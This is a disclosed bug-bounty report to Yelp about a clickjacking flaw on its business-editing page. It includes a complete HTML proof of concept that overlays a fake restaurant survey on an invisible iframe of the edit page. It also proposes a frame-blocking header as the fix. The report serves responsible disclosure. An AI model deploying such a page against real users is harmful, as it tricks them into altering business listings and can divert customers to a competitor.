# ClickJacking in editing business name

## Report Details
- **Report ID**: 227837
- **URL**: https://hackerone.com/reports/227837
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-05-12T06:05:02.739Z
- **Disclosed**: 2017-11-09T19:56:08.852Z

## Reporter
- **Username**: mohammad_obaid
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: yelp

## Vulnerability Information
##SUMMARY:

Hope you guys are doing great. I found clickjacking vulnerability while updating business page.One of the endpoints which is vulnerable to clickjacking is https://www.yelp.com/biz_attribute?biz_id=RIyHYSf3lyJcFb4El9T4tQ . Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or submitting form on behalf of user while clicking on seemingly innocuous web pages.
 I believe this time I put much more effort in demonstrating impact of this bug. I request you to please take a look at this.

##IMPACT:
Click jacking on this page will allow attacker to change business information of user like business name, email address,address,city and more importantly website name. This will cause business user to potentially lose their customer if wrong information is displayed on a business page. Moreover if website address changes it can allow attacker to divert potential customer towards its website if attacker is competitor of that business user. It can also cause to change opening hours of restaurant on behalf of user .
Any user submitted page shouldn't be loaded on iframe because it can cause submission of form on behalf of user .

##POC:
Below here is the poc of existence of this vulnerability. I dint hide iframe in below poc so that you can see vulnerable page is successfully loaded in an iframe. 

```
<html  >
   <head>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
   </head>
   
   
   <body style="background-color:#c5d5cb;">
     
   
    
<div style="position: absolute; left: 200px; top: 50px;">
  <div class="well" style="background-color:#6195ad;margin-right: 147px;box-shadow: inset 0 1px 17px 15px rgba(0,49,0,.05);padding:30px;">
  <h1>This is a Survey Form</h1>
  <p>We are opening new Restaurant in the city of Manhattan. For this we are asking suggestions from internet world regarding restaurant name, where it should be located ets. Please do fill form below.</p>
</div>
<h2 style="">Please help us building Restaurant which is purely based upon your suggestions.</h2>

<input type = "text"
                 id = "myText"
                  style="position:absolute;margin-top: 249px;
    margin-left: 33px;
    width: 367px" placeholder="Please enter suitable name of Restaurent" />
<input type = "text"
                 id = "myText"
                  style="position:absolute;margin-top: 318px;
    margin-left: 33px;
    width: 367px" placeholder="Pleae enter location of Restaurent in Manhattan" />
	<input type = "text"
                 id = "myText"
                  style="position:absolute;margin-top: 745px;
    margin-left: 33px;
    width: 367px" placeholder="Please enter any website name " />
				 
<button type="button" class="btn btn-success" style="position: absolute;margin-top: 1311px;margin-left: 17px;width: 176px;" >Submit Your Feedback</button>

<iframe style="opacity: 0;" height="1745" width="680" scrolling="no" src="https://www.yelp.com/biz_attribute?biz_id=RIyHYSf3lyJcFb4El9T4tQ"></iframe>
   
   
   
   
   
   
   
   
   </body>
   
   
   
</html>




```
Sorry for poor styling. I'll make styling on this page better if you ask for it so that it looks more genuine and more realistic.

##FIX:
This vulnerability can easily be fixed by adding `X-HEADER-OPTION to deny` . This will prevent this page to load in an iframe.

## Attachments
No attachments
